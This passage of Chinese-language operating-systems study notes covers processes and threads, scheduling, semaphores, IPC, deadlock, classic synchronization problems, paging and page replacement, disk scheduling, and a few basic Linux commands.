- **线程是独立调度的基本单位**；一个进程可以有多个线程，他们共享资源

### 区别

- **拥有资源**：进程是资源分配的基本单位；线程不拥有资源，只可以访问隶属于进程的资源
- **调度**：线程是独立调度的基本单位，在同一个进程中，线程的切换不会引起进程的切换；从一个进程中的线程切换到另一个进程中的线程时，会引起进程切换
- **系统开销**：由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O 设备等，所付出的开销远大于创建或撤销线程时的开销，类似地，在进行进程切换时，涉及当前执行进程 CPU 环境的保存及新调度进程 CPU 环境的设置；而线程切换时只需保存和设置少量寄存器内容，开销很小
- **通信**：线程间可以通过直接读写同一进程中的数据进行通信，但是进程通信需要借助 IPC

### 进程之间私有和共享的资源

- 私有：地址空间、堆、全局变量、栈、寄存器
- 共享：代码段，公共数据，进程目录，进程 ID

### 线程之间私有和共享的资源

- 私有：线程栈，寄存器，程序计数器
- 共享：堆，地址空间，全局变量，静态变量

### 多进程与多线程

| 对比维度       | 多进程                                                       | 多线程                                                       | 总结     |
| -------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | -------- |
| 数据共享、同步 | 数据共享复杂，需要用 IPC；数据是分开的，同步简单             | 因为共享进程数据，数据共享简单，但也是因为这个原因导致同步复杂 | 各有优势 |
| 内存、CPU      | 占用内存多，切换复杂，CPU 利用率低                           | 占用内存少，切换简单，CPU 利用率高                           | 线程占优 |
| 创建销毁、切换 | 创建销毁、切换复杂，速度慢                                   | 创建销毁、切换简单，速度很快                                 | 线程占优 |
| 编程、调试     | 编程简单，调试简单                                           | 编程复杂，调试复杂                                           | 进程占优 |
| 可靠性         | 进程间不会互相影响                                           | 一个线程挂掉将导致整个进程挂掉                               | 进程占优 |
| 分布式         | 适应于多核、多机分布式；如果一台机器不够，扩展到多台机器比较简单 | 适应于多核分布式                                             | 进程占优 |

### 多进程和多线程优劣

| 优劣 | 多进程                                   | 多线程                                   |
| ---- | ---------------------------------------- | ---------------------------------------- |
| 优点 | 编程、调试简单，可靠性较高               | 创建、销毁、切换速度快，内存、资源占用小 |
| 缺点 | 创建、销毁、切换速度慢，内存、资源占用大 | 编程、调试复杂，可靠性较差               |

### 多进程和多线程选择

- 需要频繁创建销毁的优先用线程
- 需要进行大量计算的优先使用线程
- 强相关的处理用线程，弱相关的处理用进程
- 可能要扩展到多机分布的用进程，多核分布的用线程
- 都满足需求的情况下，用你最熟悉、最拿手的方式

## 进程

### 进程状态

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-15\ProcessState.png" alt="img" style="zoom:80%;" />
</div>


- **就绪状态`ready`**：等待被调度
- **运行状态`running`**：获得调度，运行中
- **等待状态`waiting`**：等待资源（进程缺少响应IO资源；访问正在被其他进程访问的临界资源，等待解锁；进程睡眠）
- **注意**
  - 只有就绪态和运行态可以相互转换，其它的都是单向转换。
  - 就绪状态的进程通过调度算法从而获得 CPU 时间，转为运行状态；而运行状态的进程，在分配给它的 CPU 时间片用完之后就会转为就绪状态，等待下一次调度
  - 阻塞状态是缺少需要的资源从而由运行状态转换而来，但是该资源不包括 CPU 时间，缺少 CPU 时间会从运行态转换为就绪态

### 进程调度算法

不同环境的调度算法目标不同，因此需要针对不同环境来讨论调度算法

#### 批处理系统：

批处理系统没有太多的用户操作，在该系统中，调度算法目标是保证吞吐量和周转时间（从提交到终止的时间）

- **先来先服务 first-come first-serverd（FCFS）**：非抢占式的调度算法，**按照请求的顺序进行调度**；有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长
- **短作业优先 shortest job first（SJF）**：非抢占式的调度算法，**按估计运行时间最短的顺序进行调度**；长作业有可能会饿死，处于一直等待短作业执行完毕的状态。因为如果一直有短作业到来，那么长作业永远得不到调度
- **最短剩余时间优先 shortest remaining time next（SRTN）**：最短作业优先的抢占式版本，按剩余运行时间的顺序进行调度。 当一个新的作业到达时，其整个运行时间与当前进程的剩余时间作比较。如果新的进程需要的时间更少，则挂起当前进程，运行新的进程。否则新的进程等待

#### 交互式系统：

交互式系统有大量的用户交互操作，在该系统中调度算法的目标是快速地进行响应

- **时间片轮转**：将所有就绪进程按 FCFS 的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程可以执行一个时间片。当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首的进程；

  - 时间片轮转算法的效率和时间片的大小有很大关系：
  - 因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间；
  - 而如果时间片过长，那么实时性就不能得到保证

- **优先级调度**：为每个进程分配一个优先级，按优先级进行调度；

  - 为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级

- **多级反馈队列**：多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。

  - 进程在第一个队列没执行完，就会被移到下一个队列；
  - 这种方式下，100个时间片的进程只需要交换 7 次；
  - 每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程；
  - 可以将这种调度算法看成是时间片轮转调度算法和优先级调度算法的结合

  <div class="image-wrapper" style="text-align: center">
  <img src="..\\assets\post\2020-02-15\multilevelfeedback.png" alt="img" style="zoom:80%;" />
  </div>

#### 实时系统：

实时系统要求一个请求在一个确定时间内得到响应

分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时

### 进程互斥、同步、通信

在多道程序设计系统中，同一时刻可能有许多进程，这些进程之间存在两种基本关系：**竞争关系和协作关系**

- 为了解决进程间**竞争关系**（**间接制约关系**）而引入进程互斥
- 为了解决进程间**松散的协作**关系( **直接制约关系**)而引入进程同步
- 为了解决进程间**紧密的协作**关系而引入进程通信

#### 竞争关系

系统中的多个进程之间彼此无关，它们并不知道其他进程的存在，并且也不受其他进程执行的影响。资源竞争会出现两个控制问题：

- 死锁（deadlock）问题：一组进程如果都获得了部分资源，还想要得到其他进程所占有的资源，最终所有的进程将陷入死锁
- 饥饿（starvation）问题：一个进程由于其他进程总是优先于它而被无限期拖延

**进程的互斥**（mutual exclusion ）是解决进程间竞争关系( **间接制约关系**) 的手段。 进程互斥指若干个进程要使用同一共享资源时，任何时刻最多允许一个进程去使用，其他要使用该资源的进程必须等待，直到占有资源的进程释放该资源。

#### 协作关系

某些进程为完成同一任务需要分工协作，由于合作的每一个进程都是独立地以不可预知的速度推进，这就需要相互协作的进程在某些协调点上协调各自的工作；

当合作进程中的一个到达协调点后，在尚未得到其伙伴进程发来的消息或信号之前应**阻塞**自己，直到其他合作进程发来协调信号或消息后方被唤醒并继续执行；

这种协作进程之间相互等待对方消息或信号的协调关系称为进程同步。

进程间的协作可以是双方不知道对方名字的间接协作，例如，通过共享访问一个缓冲区进行松散式协作；也可以是双方知道对方名字，直接通过通信机制进行紧密协作。

允许进程协同工作**有利于共享信息、有利于加快计算速度、有利于实现模块化程序设计**。

**进程的同步**（Synchronization）是解决进程间协作关系( **直接制约关系**) 的手段。

- 进程同步指两个以上进程基于某个条件来协调它们的活动。一个进程的执行依赖于另一个协作进程的消息或信号，当一个进程没有得到来自于另一个进程的消息或信号时则需等待，直到消息或信号到达才被唤醒。
- **互斥**是一种**特殊的同步**。

**进程同步是一种进程通信**，通过修改信号量，进程之间可以建立联系，相互协调运行和协同工作。但是信号量和PV操作只能传递信号，没有传递数据的能力。

进程之间互相交换信息的工作称之为进程通信IPC（Inter Process Communication），**主要指大量数据的交换**。

### 进程同步

为了避免竞争条件，操作系统需要利用同步机制在并发执行时，保证对临界区的互斥访问。进程同步的解决方案主要有：信号量和管程。

对于同步机制，需要遵循以下四个规则：

- 空闲则入：没有进程在临界区时，任何进程可以进入；
- 忙则等待：有进程在临界区时，其他进程均不能进入临界区；
- 有限等待：等待进入临界区的进程不能无限期等待；
- 让权等待（可选）：不能进入临界区的进程，应该释放 `CPU`，如转换到阻塞态；

进程同步方式：

- 信号量（`Semaphore`）：一个整形变量，可以对其执行`down`和`up`操作，也就是常见的`PV`操作，`down`和`up`操作需要被设计成原语，不可分割，通常的做法是在执行这些操作的时候屏蔽中断。如果信号量的取值只能为0或者1，那么就成为互斥量（`Mutex`），0表示临界区已经加锁，1表示临界区解锁。

  - `down`：如果信号量大于 0 ，执行 -1 操作；如果信号量等于 0，进程睡眠，等待信号量大于 0；
  - `up`：对信号量执行 +1 操作，唤醒睡眠的进程让其完成 down 操作。

  ```c++
  typedef struct {
      int value;
      struct process_control_block *list;
  } semaphore;
  //P(wait)
  wait(semaphore *S) {
      S->value--;
      if(S->value < 0) {
          block(S->list);
      }
  }
  //V(signal)
  signal(semaphore *S) {
      S->value++;
      if(S->value <= 0) {
          wakeup(S->list);
      }
  }
  ```

- 管程：采用面向对象思想，将表示共享资源的数据结构及相关的操作，包括同步机制，都集中并封装在一起，所有进程都只能通过管程间接访问临界资源，而管程只允许一个进程进入并执行操作，从而实现进程互斥。

  - 管程引入了 **条件变量** 以及相关的操作：**wait()** 和 **signal()** 来实现同步操作。对条件变量执行 wait() 操作会导致调用进程阻塞，把管程让出来给另一个进程持有。signal() 操作用于唤醒被阻塞的进程。

### 进程通信

#### 管道

管道是通过调用`pipe`函数创建的，`fd[0]`用于读，`fd[1]`用于写

```c++
#include <unistd.h>
int pipe(int fd[2]);
```

它有以下限制：

- 只支持半双工通信（双向交替传输）
- 只能在父子进程或者兄弟进程中使用

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-15\pipe.png" alt="img" style="zoom:80%;" />
</div>


#### FIFO命名管道

去除了管道中只能在父子进程之间通信的限制

```c++
#include <sys/stat.h>
int mkfifo(const char* path, mode_t mode);
int mkfifoat(int fd, const char* path, mode_t mode);
```

FIFO常用于客户-服务器应用程序中，FIFO 用作汇聚点，在客户进程和服务器进程之间传递数据

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-15\fifo.png" alt="img" style="zoom:80%;" />
</div>


#### 消息队列

相比于 FIFO，消息队列具有以下优点：

- 消息队列可以独立于读写进程存在，从而避免了 FIFO 中同步管道的打开和关闭时可能产生的困难
- 避免了 FIFO 的同步阻塞问题，不需要进程自己提供同步方法
- 读进程可以根据消息类型有选择地接收消息，而不像 FIFO 那样只能默认地接收

缺点：

- 信息的复制需要额外消耗CPU的事件，不适宜用信息量大或者操作频繁的场合

#### 信号量

一个计数器，用于为多个进程提供对共享数据对象的访问

- 优点：可以同步进程
- 缺点：信号量有限

#### 信号

一种比较复杂的通信方式，用于通知接收进程某个事件已经发生

#### 共享存储

允许多个进程共享一个给定的存储区（同一个逻辑内存）。因为数据不需要在进程之间复制，所以这是最快的一种IPC

共享内存并未提供同步机制，所以通常需要使用信号量来同步对共享存储的访问。

多个进程可以将同一个文件映射到它们的地址空间从而实现共享内存。另外 XSI 共享内存不是使用文件，而是使用内存的匿名段。

在linux中，每个进程都有属于自己的**进程控制块（PCB）和地址空间（Addr Space）**，并且都有一个与之对应的**页表**，负责将进程的逻辑地址和物理地址进行映射，通过MMU进行管理。两个不同的虚拟地址通过页表映射到物理空间的同一区域，他们所指向的这块区域就被称为共享内存。

当两个进程通过页表将虚拟地址映射到物理地址时，在物理地址中有一块共同的内存区，即共享内存，这块内存可以被两个内存同时看到。这样，当一个进程进行写操作，另一个进程进行读操作就可以实现进程间通信，同步和互斥可以使用信号量来实现。

优点：

- 快速，方便

缺点：

- 通信是通过将共享空间缓冲区直接附加到进程的虚拟地址空间中来实现的，因此进程间的读写操作的**同步**问题
- 利用内存缓冲区直接交换信息，内存的实体存在于计算机中，只能同一个计算机系统中的诸多进程共享，不方便网络通信

##### 使用方式

```c++
#include <sys/ipc.h>
#include <sys/shm.h>

// 创建或者访问共享内存
int shmget(key_t key, size_t size, int shmflg);

// 附加内存到进程的地址空间
void *shmat(int shmid, const void * shmaddr, int shmflg);

// 从进程的地址空间分离共享内存
int shmdt(const void *shmaddr);

// 控制共享内存
int shmctl(int shmid, int cmd, struct shmid_ds *buf);
// IPC_STAT:获取当前共享内存的`shmid_ds`结构并保存在buf中
// IPC_SET:使用buf中的值设置当前共享内存的shmid_ds结构
// IPC_EMID删除当前共享内存
```

#### socket套接字

与其它通信机制不同的是，它可用于不同机器间的进程通信

- 优点：1，传输数据为字节级别，数据可自定义，数据量小且效率高；2，传输数据时间段，性能高；3，适合客户端和服务端的信息实时交互；4，可以加密，安全性高
- 缺点：需要对数据解析，转化为应用级的数据

### 正常进程、僵死进程、孤儿进程

- 正常进程

  - 正常情况下，子进程是通过父进程创建的，子进程再创建新的进程。子进程的结束和父进程的运行是一个异步过程，即父进程永远无法预测子进程到底什么时候结束。 当一个进程完成它的工作终止之后，它的父进程需要调用**wait()或者waitpid()**系统调用取得子进程的终止状态。
  - unix提供了一种机制可以保证只要父进程想知道子进程结束时的状态信息， 就可以得到：在每个进程退出的时候，内核释放该进程所有的资源，包括打开的文件，占用的内存等。 但是仍然为其保留一定的信息，直到父进程通过wait / waitpid来取时才释放。保存信息包括：
    - 进程号pid
    - 退出状态
    - 运行时间等

- 孤儿进程

  - 一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。

- 僵尸进程

  - 一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵尸进程。

  - 僵尸进程是一个进程必然会经过的过程：这是每个子进程在结束时都要经过的阶段。

  - 如果子进程在exit()之后，父进程没有来得及处理，这时用ps命令就能看到子进程的状态是“Z”。如果父进程能及时 处理，可能用ps命令就来不及看到子进程的僵尸状态，但这并不等于子进程不经过僵尸状态。

  - 如果父进程在子进程结束之前退出，则子进程将由init接管。init将会以父进程的身份对僵尸状态的子进程进行处理。

  - 危害：

    - 如果进程不调用wait / waitpid的话， 那么保留的那段信息就不会释放，其进程号就会一直被占用，但是系统所能使用的进程号是有限的，如果大量的产生僵死进程，将因为没有可用的进程号而导致系统不能产生新的进程。
  
  -  外部消灭：
    - 通过kill发送SIGTERM或者SIGKILL信号消灭产生僵尸进程的进程，它产生的僵死进程就变成了孤儿进程，这些孤儿进程会被init进程接管，init进程会wait()这些孤儿进程，释放它们占用的系统进程表中的资源
  - 内部解决：
    - 子进程退出时向父进程发送SIGCHILD信号，父进程处理该信号。在信号处理函数中调用wait进行处理僵尸进程。
    - fork两次，原理是将子进程称为孤儿进程，从而它的父进程会变成init进程，通过init进程可以处理僵尸进程。

​    

## fork（pid_t fork(void);）

一个现有进程调用fork()函数创建一个新的进程。

fork函数被调用一次，但是返回两次。两次返回的唯一区别是子进程的返回值是0，父进程的返回值是子进程的pid（错误返回-1）.

父子进程共享代码段，但是分别拥有自己的数据段和堆栈段（现在很多并不真实复制，而是采用写时复制）

### 调用流程

- 给新进程分配一个标识符
- 在内核中分配一个PCB，将其挂在PCB表上
- 复制它的父进程的环境（PCB中大部分的内容）
- 为其分配资源（程序、数据、栈等）
- 复制父进程地址空间的内容（代码共享，数据写时复制）
- 将进程设置为就绪状态，并将其放入就绪队列，等待CPU调度。

### fork和vfork

- fork()的子进程拷贝父进程的数据段和代码的；vfork()的子进程和父进程共享数据段
- fork()的父子进程执行顺序不确定；vfor()保证子进程先运行，在调用exec和exit之前与父进程数据是共享的，调用之后父进程才可能被调度运行；所以如果调用之前子进程依赖于父进程的进一步动作，则会导致死锁

## 线程

###　线程同步

- **临界区（Critical Section）**：通过对多线程的串行化来访问公共资源或一段代码，速度快，适合控制数据访问
- **互斥量（Mutex）**：为协调共同对一个共享资源的单独访问而设计的
- **信号量（Semaphore）**：为控制一个具有有限数量用户资源而设计
- **事件（Event）**：用来通知线程有一些事件已发生，从而启动后继任务的开始

### 线程通信

- 锁机制：
  - 互斥锁：提供了以排他方式防止数据结构被并发修改的方法
  - 读写锁：允许多个线程同时读共享数据，而对写操作是互斥的
  - 自旋锁：与互斥锁类似，都是为了保护共享资源；互斥锁是检测到被占用时睡眠，自旋锁是循环检测是否释放
  - 条件变量：可以以原子的方式阻塞进程，直到某个特定条件为真为止，对条件的检测是在互斥锁的保护下进行的
- 信号量机制：无名线程信号量，命名线程信号量
- 信号机制：类似进程的信号
- 屏障：允许多个线程等待，直到所有的合作线程都到达某一点，然后从该点继续进行

### 线程调度

- 分时调度策略，是一种非实时调度策略，系统会为每个线程分配一段运行时间，称为时间片
- 先来先服务策略，支持优先级抢占。CPU让一个先来的线程执行完再调度下一个线程，顺序就是按照创建线程栈的先后。线程一旦占用cpu就会一直运行，直到有更高级的任务到达或者自己放弃cpu
- 时间片轮转调度策略，但支持优先级抢占，因此是一种实时调度策略。

## 死锁

两个或者两个以上的进程在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，若无外力作用，他们将无法推进下去。

原因：

- 系统资源不足
- 资源分配不当
- 进程推进顺序不合适

### 必要条件

- **互斥**：每个资源要么已经分配给了一个进程，要么就是可用的
- **占有和等待**：已经得到了某个资源的进程可以再请求新的资源
- **不可抢占**：已经分配给一个进程的资源不能强制性的被抢占，他只能被占有他的进程显式释放
- **环路等待**：有两个或者两个以上的进程组成一个环路，该环路中的每个进程都在等待下一个进程所占有的资源

### 编码时解决

- 保证两个互斥量上锁的顺序一致，就不会死锁

- 使用`std::lock()`一次锁住多个互斥量，不存在因为锁头的顺序问题导致的死锁风险问题

- ```c++
  std::lock(mutex1, mutex2);
  std::lock_guard lock1(mutex1, std::adopt_lock);
  std::lock_guard lock2(mutex2, std::adopt_lock);
  ```

### 处理方法

- **鸵鸟策略**：当作没有发生死锁

  - 因为解决死锁的代价很大，因此这种方案可以获得更高的性能；当发生死锁时不会对用户造成很大影响，或者发生死锁的概率很低，可以采用鸵鸟策略；大多数操作系统，包括`unix`，`linux`和`windows`处理死锁问题的办法仅仅是忽略他

- **死锁检测和死锁恢复**：不试图阻止死锁，而是检测到死锁发生时，采取措施进行恢复

  - 每种类型一个资源的死锁检测通过检测有向图是否存在环来实现。
  - 每种类型多个资源的死锁检测
  - 死锁恢复：利用抢占恢复，利用回滚恢复，通过杀死进程恢复

- **死锁预防**：在程序运行之前预防死锁

  - 破坏互斥条件
  - 破坏占有和等待条件：一种方式是规定所有进程在开始执行前请求所需的全部资源
  - 破坏不可抢占条件
  - 破坏环路等待：给资源统一编号，进程只能按照编号顺序来请求资源

- **死锁避免**：在运行时避免发生死锁

  - **安全状态**：是指如果没有死锁发生，并且即使所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能够使得每个进程运行完毕，则称该状态是安全的

    <div class="image-wrapper" style="text-align: center">
    <img src="..\\assets\post\2020-02-15\safestate.png" alt="img" style="zoom:80%;" />
    </div>

  - 上图中，图a的第二列Has表示进程已经拥有的资源数，第三列Max表示进程总共需要的资源数，Free表示还有可以使用的资源数。从图a开始，先让B拥有所需的有时又资源，运行结束后释放B，此时free变为5；以同样方式运行C和A，使得所有进程都能成功运行，因此可以**称A的状态是安全**的。

  - **银行家算法**：判断对请求的满足是否会进入不安全状态，如果是就拒绝请求；否则予以分配

## Linux的四种锁

- **互斥锁**：mutex，用于保证在任何时刻，都只能有一个线程访问该对象，当获取所操作失败时，线程进入睡眠，等待所释放时被唤醒。
- **读写锁**：rwlock，读写锁适合于对数据结构的读次数比写次数多得多的情况。因为读模式锁定时可以共享，以写模式锁住时意味着独占，所以读写锁又叫共享-独占锁。
- **自旋锁**：spinlock，在任何时刻同样只能有一个线程访问对象。但是当获取锁操作失败时，不会进入睡眠，而是会在原地自旋，直到锁被释放。这样节省了线程从睡眠状态到被唤醒期间的消耗，在加锁时间短暂的环境下会极大的提高效率。但如果加锁时间过长，则会非常浪费CPU资源。

## 经典同步问题

### 哲学家进餐问题

多个哲学家围着一张圆桌，每个哲学家面前放着食物。哲学家的生活有两种交替活动：吃饭以及思考。当一个哲学家吃饭时，需要先拿起自己左右两边的两根筷子，并且一次只能拿起一根筷子。

下面是一种错误的解法，如果所有哲学家同时拿起左手边的筷子，那么所有哲学家都在等待其它哲学家吃完并释放自己手中的筷子，导致死锁。

```c++
#define N 5
void philosopher(int i) {
    while(TRUE) {
        think();
        take(i);       // 拿起左边的筷子
        take((i+1)%N); // 拿起右边的筷子
        eat();
        put(i);
        put((i+1)%N);
    }
}
```

为了防止死锁的发生，可以设置两个条件：

- 必须同时拿起左右两根筷子；
- 只有在两个邻居都没有进餐的情况下才允许进餐。

```c++
#define N 5
#define LEFT (i + N - 1) % N // 左邻居
#define RIGHT (i + 1) % N    // 右邻居
#define THINKING 0
#define HUNGRY   1
#define EATING   2
typedef int semaphore;
int state[N];                // 跟踪每个哲学家的状态
semaphore mutex = 1;         // 临界区的互斥，临界区是 state 数组，对其修改需要互斥
semaphore s[N];              // 每个哲学家一个信号量

void philosopher(int i) {
    while(TRUE) {
        think(i);
        take_two(i);
        eat(i);
        put_two(i);
    }
}

void take_two(int i) {
    down(&mutex);
    state[i] = HUNGRY;
    check(i);
    up(&mutex);
    down(&s[i]); // 只有收到通知之后才可以开始吃，否则会一直等下去
}

void put_two(i) {
    down(&mutex);
    state[i] = THINKING;
    check(LEFT); // 尝试通知左右邻居，自己吃完了，你们可以开始吃了
    check(RIGHT);
    up(&mutex);
}

void eat(int i) {
    down(&mutex);
    state[i] = EATING;
    up(&mutex);
}

// 检查两个邻居是否都没有用餐，如果是的话，就 up(&s[i])，使得 down(&s[i]) 能够得到通知并继续执行
void check(i) {         
    if(state[i] == HUNGRY && state[LEFT] != EATING && state[RIGHT] !=EATING) {
        state[i] = EATING;
        up(&s[i]);
    }
}
```

### 读者-写者问题

允许多个进程同时对数据进行读操作，但是不允许读和写以及写和写操作同时发生。

一个整型变量 count 记录在对数据进行读操作的进程数量，一个互斥量 count_mutex 用于对 count 加锁，一个互斥量 data_mutex 用于对读写的数据加锁。

```c++
typedef int semaphore;
semaphore count_mutex = 1;
semaphore data_mutex = 1;
int count = 0;

void reader() {
    while(TRUE) {
        down(&count_mutex);
        count++;
        if(count == 1) down(&data_mutex); // 第一个读者需要对数据进行加锁，防止写进程访问
        up(&count_mutex);
        read();
        down(&count_mutex);
        count--;
        if(count == 0) up(&data_mutex);
        up(&count_mutex);
    }
}

void writer() {
    while(TRUE) {
        down(&data_mutex);
        write();
        up(&data_mutex);
    }
}
```

# 操作系统内存管理

## 虚拟内存

- 目的是为了让物理内存扩充成更大的逻辑内存，从而让程序获得更多的可用内存

- 为了更好的管理内存，系统将内存抽象成地址空间。
- 每个程序拥有自己的地址空间，这个地址空间被分为多个块，每一块为一页。这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都在物理内存中。
- 当引用到不再物理内存中的页时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的命令
- 虚拟内存允许内存不用将地址空间中的每一页都映射到物理内存，也就是说一个程序不需要全部调入内存就可以运行。16位地址可以映射64KB地址，32位可以映射4GB地址。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-20\virtualaddr.png" alt="img" style="zoom:80%;" />
</div>


### 分页系统地址映射

内存管理单元（`Memory Management Unit, MMU`）管理着地址空间和物理内存的转换，其中的页表（`Page table`）存储着页（程序地址空间）和页框（物理内存空间）的映射表。

一个虚拟地址分成两个部分，一部分存储页面号，一部分存储偏移量。即（存储页面号+页内偏移量）

下图的页表存放着 16 个页，这 16 个页需要用 4 个比特位来进行索引定位。例如对于虚拟地址（`0010 0000 0000 0100`），前 4 位是存储页面号 2，读取表项内容为（`110 1`），页表项最后一位表示是否存在于内存中，1 表示存在，0表示不存在。后 12 位存储偏移量。这个页对应的页框的地址为 （`110 0000 0000 0100`）。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-20\mmu.png" alt="img" style="zoom:60%;" />
</div>


### 页面置换算法

在程序运行过程中，如果要访问的页面不在内存中，就发生**缺页中断**从而将该页调入内存中。此时如果内存已无空闲空间，系统必须从内存中调出一个页面到磁盘对换区中来腾出空间。

页面置换算法和缓存淘汰策略类似，可以将内存看成磁盘的缓存。在缓存系统中，缓存的大小有限，当有新的缓存到达时，需要淘汰一部分已经存在的缓存，这样才有空间存放新的缓存数据。

页面置换算法的主要目标是使页面置换频率最低（也可以说缺页率最低）。

#### 最佳（Optimal replacement algorithm, OPT）

所选择的被换出的页面将是最长时间内不再被访问，通常可以保证获得最低的缺页率。

是一种理论上的算法，因为无法知道一个页面多长时间不再被访问。

#### 最近最久未使用（Least Recently Used，LRU）

虽然无法知道将来要使用的页面情况，但是可以知道过去使用页面的情况。LRU 将最近最久未使用的页面换出。

为了实现 LRU，需要在内存中维护一个所有页面的链表。**当一个页面被访问时，将这个页面移到链表表头**。这样就能保证链表表尾的页面是最近最久未访问的。

因为每次**访问都需要更新链表**，因此这种方式实现的 LRU 代价很高。

#### 最近未使用（Not Recently Used，NRU）

每个页面都有两个状态位：R 与 M，当页面被访问时设置页面的 R=1，当页面被修改时设置 M=1。其中 R 位会定时被清零。可以将页面分成以下四类：

- R=0，M=0
- R=0，M=1
- R=1，M=0
- R=1，M=1

当发生缺页中断时，NRU 算法随机地从类编号最小的非空类中挑选一个页面将它换出。

NRU 优先换出已经被修改的**脏页面（R=0，M=1）**，而不是被频繁使用的**干净页面（R=1，M=0）**

#### 先入先出（First In First Out, FIFO）

选择换出的页面是最先进入的页面。

该算法会将那些经常被访问的页面换出，导致缺页率升高。

#### 第二次机会算法

FIFO 算法可能会把经常使用的页面置换出去，为了避免这一问题，对该算法做一个简单的修改：

- 当页面被访问 (读或写) 时设置该页面的 R 位为 1。
- 需要替换的时候，检查最老页面的 R 位。
- 如果 R 位是 0，那么这个页面既老又没有被使用，可以立刻置换掉；
- 如果是 1，就将 R 位清 0，并把该页面放到链表的尾端，修改它的装入时间使它就像刚装入的一样，然后继续从链表的头部开始搜索。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-20\secondchance.png" alt="img" style="zoom:80%;" />
</div>


#### 时钟（Clock）

第二次机会算法需要在链表中移动页面，降低了效率。时钟算法使用环形链表将页面连接起来，再使用一个指针指向最老的页面。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-20\clock.png" alt="img" style="zoom:80%;" />
</div>


## 分段

虚拟内存采用的是分页技术，也就是将地址空间划分成固定大小的页，每一页再与内存进行映射。

下图为一个编译器在编译过程中建立的多个表，有 4 个表是动态增长的，如果使用分页系统的一维地址空间，动态增长的特点会导致覆盖问题的出现。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-20\segment.png" alt="img" style="zoom:80%;" />
</div>


分段的做法是把每个表分成段，**一个段构成一个独立的地址空间**。每个段的长度可以不同，并且可以动态增长。

## 段页式

程序的地址空间划分成多个拥有独立地址空间的段，每个段上的地址空间划分成大小相同的页。这样既拥有分段系统的共享和保护，又拥有分页系统的虚拟内存功能。

### 分页和分段的比较

- 对程序员：分页透明，分段需要程序员显式划分每个段
- 地址空间维度：分页地址是一维的，分段地址是二维（段名+段内地址）的
- 大小是否可以改变：分页不可变，分段可变
- 出现的原因：分页主要用于虚拟内存，从而获得更大的地址空间；分段是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护

# 操作系统之磁盘

## 磁盘结构

- 盘面（Platter）：一个磁盘有多个盘面；
- 磁道（Track）：盘面上的圆形带状区域，一个盘面可以有多个磁道；
- 扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是最小的物理储存单位，目前主要有 512 bytes 与 4 K 两种大小；
- 磁头（Head）：与盘面非常接近，能够将盘面上的磁场转换为电信号（读），或者将电信号转换为盘面的磁场（写）；
- 制动手臂（Actuator arm）：用于在磁道之间移动磁头；
- 主轴（Spindle）：使整个盘面转动。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-25\disk.png" alt="img" style="zoom:80%;" />
</div>


## 磁盘调度算法

读写一个磁盘块的时间的影响因素有：

- 旋转时间（主轴转动盘面，使得磁头移动到适当的扇区上）
- 寻道时间（制动手臂移动，使得磁头移动到适当的磁道上）
- 实际的数据传输时间

其中，寻道时间最长，因此磁盘调度的主要目标是使磁盘的平均寻道时间最短。

### 先来先服务（First Come First Served, FCFS）

按照磁盘请求的顺序进行调度。

优点是公平和简单。缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。

### 最短寻道时间优先（Shortest Seek Time First, SSTF）

优先调度与当前磁头所在磁道距离最近的磁道。

虽然平均寻道时间比较低，但是不够公平。如果新到达的磁道请求总是比一个在等待的磁道请求近，那么在等待的磁道请求会一直等待下去，也就是出现饥饿现象。具体来说，两端的磁道请求更容易出现饥饿现象。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-25\SSTF.png" alt="img" style="zoom:80%;" />
</div>


### 电梯算法（SCAN）

电梯总是保持一个方向运行，直到该方向没有请求为止，然后改变运行方向。

电梯算法（扫描算法）和电梯的运行过程类似，总是按一个方向来进行磁盘调度，直到该方向上没有未完成的磁盘请求，然后改变方向。

因为考虑了移动方向，因此所有的磁盘请求都会被满足，解决了 SSTF 的饥饿问题。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-25\SCAN.png" alt="img" style="zoom:80%;" />
</div>
# 操作系统之面试题

## Linux常用命令

```
ls			显示文件或者目录
	-l		列出文件详细信息
	-a		列出当前目录下所有文件及目录，包括隐藏的
mkdir		创建目录
	-p		创建目录，如果没有父目录，则创建它
cd			切换目录
touch		创建空文件
lsof -i:port				查看端口被哪个进程占用
netstat -anp|grep port		查看端口被哪个进程占用
ps -aux|grep process		查看进程

